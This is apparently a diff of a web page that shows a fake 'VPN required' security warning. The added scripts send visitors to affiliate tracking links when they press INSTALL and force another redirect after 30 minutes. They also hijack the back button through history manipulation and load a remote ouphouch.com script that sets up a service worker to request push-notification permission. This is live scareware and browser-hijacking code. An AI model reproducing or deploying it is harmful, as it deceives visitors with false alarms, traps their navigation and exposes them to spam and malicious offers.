@@ -176,24 +176,68 @@
         <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close"><span class="ui-button-icon ui-icon ui-icon-closethick"></span><span class="ui-button-icon-space"> </span></button>
       </div>
       <div id="dialog" class="ui-dialog-content ui-widget-content" style="width: auto; min-height: 55.0219px; max-height: none; height: auto; margin-top: 12px;">
-        <div style="text-align: center;"><strong id="lang_title" class="lang-2" data-langkey="title">VPN highly suggested for this site</strong></div>
-        <p id="lang_desc" style="text-align: center;" class="lang-3" data-langkey="description">Your browsing, streaming and download activity may be not private and may be unsecured.</p>
+        <div style="text-align: center;"><strong id="lang_title" class="lang-2" data-langkey="title">VPN Requires For Our Website!</strong></div>
+        <p id="lang_desc" style="text-align: center;" class="lang-3" data-langkey="description">Your browsing, streaming and download activity is not private and is unsecured.</p>
       </div>
       <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix ">
         <div class="ui-dialog-buttonset" id="install-frame">
 
-            <button id="lang_install" type="button" class="ui-button ui-corner-all ui-widget lang-4" data-langkey="button">INSTALL</button>
+            <button id="lang_install" onclick="redirect();" type="button" class="ui-button ui-corner-all ui-widget lang-4" data-langkey="button">INSTALL</button>
 
         </div>
       </div>
     </div>
   </div>
-  <script src="url.js"></script>
   <script type="text/javascript">
     setTimeout(function() {
       document.querySelector('.ui-dialog').classList.add('show');
     }, 500)
   </script>
-
+<script type="text/javascript">
+  function redirect() {
+     window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+     setTimeout(function () {
+       window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+     },  5000)
+   }
+  </script>
+  
+  <script type="text/javascript">
+  setTimeout(function () {
+    window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+  }, 1800000);
+  </script>
+  
+  <script type="text/javascript">
+  ! function () {
+      var t;
+      try {
+          const URL = window.location.href.split(/[#]/)[0];
+          for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+          onpopstate = function(event){
+              event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+          }
+      } catch (o) { console.log( o ); }
+  }();
+  </script>
+  
+  <script>
+  //org.rangextd.buzz
+  var url = new URL(window.location.href);
+  var pci = url.searchParams.get('clickid');
+  var s = document.createElement('script');
+  s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&ymid='+pci+'&sw=/sw-check-permissions-747a6.js';
+  s.onload = function(result) {
+    switch (result) {
+        case 'onPermissionDefault':break;
+        case 'onPermissionAllowed':break;
+        case 'onPermissionDenied':break;
+        case 'onAlreadySubscribed':break;
+        case 'onNotificationUnsupported':break;
+    }
+  }
+  
+  document.head.appendChild(s);
+  </script>
 
 </body></html>
